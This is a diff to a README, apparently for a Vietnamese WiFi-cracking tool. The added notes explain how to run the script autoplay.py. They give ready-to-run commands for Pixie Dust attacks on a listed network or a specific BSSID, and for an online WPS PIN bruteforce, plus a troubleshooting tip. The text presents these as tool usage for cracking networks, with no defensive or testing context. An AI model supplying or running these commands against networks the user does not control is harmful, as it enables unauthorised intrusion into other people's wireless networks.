@@ -14,3 +14,16 @@ Crack wps wifi
 * cd thoitiet
 * chmod +x autoplay.py
 * sudo python autoplay.py -i wlan0 -K
+# Ghi Chú :
+Đầu tiên hãy tắt Wifi.
+
+Hiển thị các mạng khả dụng và bắt đầu tấn công Pixie Dust trên mạng được chỉ định.
+
+sudo python autoplay.py -i wlan0 -K
+
+Bắt đầu tấn công Pixie Dust vào BSSID được chỉ định: sudo python autoplay.py -i wlan0 -b 00:91:4C:C3:AC:28 -K
+Khởi chạy WPS bruteforce trực tuyến với nửa đầu mã PIN được chỉ định:
+sudo python autoplay.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
+
+#Xử Lí Sự Cố
+"Thiết bị hoặc tài nguyên đang bận (-16)" - Bật Wifi rồi tắt Wifi.
